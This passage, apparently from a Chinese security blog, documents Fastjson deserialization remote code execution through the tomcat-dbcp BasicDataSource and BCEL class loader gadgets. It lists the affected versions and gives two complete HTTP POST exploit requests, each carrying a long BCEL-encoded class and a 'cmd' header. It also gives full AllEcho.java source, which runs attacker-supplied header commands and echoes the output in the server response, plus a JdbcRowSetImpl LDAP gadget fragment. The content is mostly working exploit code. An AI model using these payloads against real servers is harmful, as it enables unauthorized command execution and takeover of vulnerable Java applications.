&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Cat&quot;,        &quot;autoCommit&quot;:&quot;true&quot;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5、直接回显</p><hr><h2 id="基于dbcp的fastjson-rce-回显"><a href="#基于dbcp的fastjson-rce-回显" class="headerlink" title="基于dbcp的fastjson rce 回显"></a>基于dbcp的fastjson rce 回显</h2><ul><li>fastjson &lt;= 1.2.24</li><li>1.2.33 &lt;= fastjson &lt;= 1.2.47</li><li>jdk &lt;= 8u251</li><li>存在 tomcat-dbcp</li></ul><p>首先将<code>AllEcho.java</code>编译生成<code>AllEcho.class</code>文件，然后用BCELEncode 对class 文件进行bcel编码</p><ul><li>fastjson &lt;= 1.2.24 poc</li><li>解析使用的JSON.parse()</li></ul><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;json HTTP&#x2F;1.1Host: 127.0.0.1:9092Content-Type: application&#x2F;jsoncmd: ver &amp;&amp; echo fastjsonContent-Length: 3327&#123;    &#123;        &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,        &quot;x&quot;:&#123;                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A&quot;        &#125;    &#125;: &quot;x&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意修改<code>Content-Type: application/json</code></p><ul><li>1.2.33 &lt;= fastjson &lt;= 1.2.47 poc</li><li>JSON.parseObject()</li><li>还需要调用toJSONString()</li><li>注意修改<code>Content-Type: application/json</code></li></ul><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;json HTTP&#x2F;1.1Host: 127.0.0.1:9092Content-Type: application&#x2F;jsoncmd: whoamiContent-Length: 3647&#123;    &quot;xx&quot;:    &#123;        &quot;@type&quot; : &quot;java.lang.Class&quot;,        &quot;val&quot;   : &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;    &#125;,    &quot;x&quot; : &#123;        &quot;name&quot;: &#123;            &quot;@type&quot; : &quot;java.lang.Class&quot;,            &quot;val&quot;   : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;        &#125;,        &#123;            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,            &quot;c&quot;: &#123;                &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driverClassName&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A&quot;            &#125;        &#125; : &quot;xxx&quot;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>AllEcho.java 对于其他的中间件的兼容效果比较好。</p><pre class="line-numbers language-none"><code class="language-none">public class AllEcho &#123;    static java.util.HashSet&lt;Object&gt; h;    static ClassLoader cl &#x3D; java.lang.Thread.currentThread().getContextClassLoader();    static Class hsr;&#x2F;&#x2F;HTTPServletRequest.class    static Class hsp;&#x2F;&#x2F;HTTPServletResponse.class    static String cmd;    static Object r;    static Object p;    public AllEcho() &#123;        r &#x3D; null;        p &#x3D; null;        h &#x3D;new java.util.HashSet&lt;Object&gt;();        try &#123;            hsr &#x3D; cl.loadClass(&quot;javax.servlet.http.HttpServletRequest&quot;);            hsp &#x3D; cl.loadClass(&quot;javax.servlet.http.HttpServletResponse&quot;);        &#125; catch (ClassNotFoundException e) &#123;            e.printStackTrace();        &#125;        F(java.lang.Thread.currentThread(),0);    &#125;    private static boolean i(Object obj)&#123;        if(obj&#x3D;&#x3D;null|| h.contains(obj))&#123;            return true;        &#125;        h.add(obj);        return false;    &#125;    private static void p(Object o, int depth)&#123;        if(depth &gt; 52||(r !&#x3D;null&amp;&amp; p !&#x3D;null))&#123;            return;        &#125;        if(!i(o))&#123;            if(r &#x3D;&#x3D;null&amp;&amp;hsr.isAssignableFrom(o.getClass()))&#123;                r &#x3D; o;                &#x2F;&#x2F;Tomcat特殊处理                try &#123;                    cmd &#x3D; (String)hsr.getMethod(&quot;getHeader&quot;,new Class[]&#123;String.class&#125;).invoke(o,&quot;cmd&quot;);                    if(cmd&#x3D;&#x3D;null) &#123;                        r &#x3D; null;                    &#125;else&#123;                        &#x2F;&#x2F;System.out.println(&quot;find Request&quot;);                        try &#123;                            java.lang.reflect.Method getResponse &#x3D; r.getClass().getMethod(&quot;getResponse&quot;);                            p &#x3D; getResponse.invoke(r);                        &#125; catch (Exception e) &#123;                            &#x2F;&#x2F;System.out.println(&quot;getResponse Error&quot;);                            r&#x3D;null;                            &#x2F;&#x2F;e.printStackTrace();                        &#125;                    &#125;                &#125; catch (IllegalAccessException e) &#123;                    e.printStackTrace();                &#125; catch (java.lang.reflect.InvocationTargetException e) &#123;                    e.printStackTrace();                &#125; catch (NoSuchMethodException e) &#123;                    e.printStackTrace();                &#125;            &#125;else if(p &#x3D;&#x3D;null&amp;&amp;hsp.isAssignableFrom(o.getClass()))&#123;                p &#x3D;  o;            &#125;            if(r !&#x3D;null&amp;&amp; p !&#x3D;null)&#123;                try &#123;                    String charsetName &#x3D; System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? &quot;GBK&quot;:&quot;UTF-8&quot;;                    java.io.PrintWriter pw &#x3D;  (java.io.PrintWriter)hsp.getMethod(&quot;getWriter&quot;).invoke(p);                    pw.println(new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream(),charsetName).useDelimiter(&quot;\\A&quot;).next());                    pw.flush();                    pw.close();                    &#x2F;&#x2F;p.addHeader(&quot;out&quot;,new Scanner(Runtime.getRuntime().exec(r.getHeader(&quot;cmd&quot;)).getInputStream()).useDelimiter(&quot;\\A&quot;).next());                &#125;catch (Exception e)&#123;                &#125;                return;            &#125;            F(o,depth+1);        &#125;    &#125;    private static void F(Object start, int depth)&#123;        Class n&#x3D;start.getClass();        do&#123;            for (java.lang.reflect.Field declaredField : n.getDeclaredFields()) &#123;                declaredField.setAccessible(true);                Object o &#x3D; null;                try&#123;                    o &#x3D; declaredField.get(start);                    if(!o.getClass().isArray())&#123;                        p(o,depth);                    &#125;else&#123;                        for (Object q : (Object[]) o) &#123;                            p(q, depth);                        &#125;                    &#125;                &#125;catch (Exception e)&#123;                &#125;            &#125;        &#125;while(                (n &#x3D; n.getSuperclass())!&#x3D;null        );    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
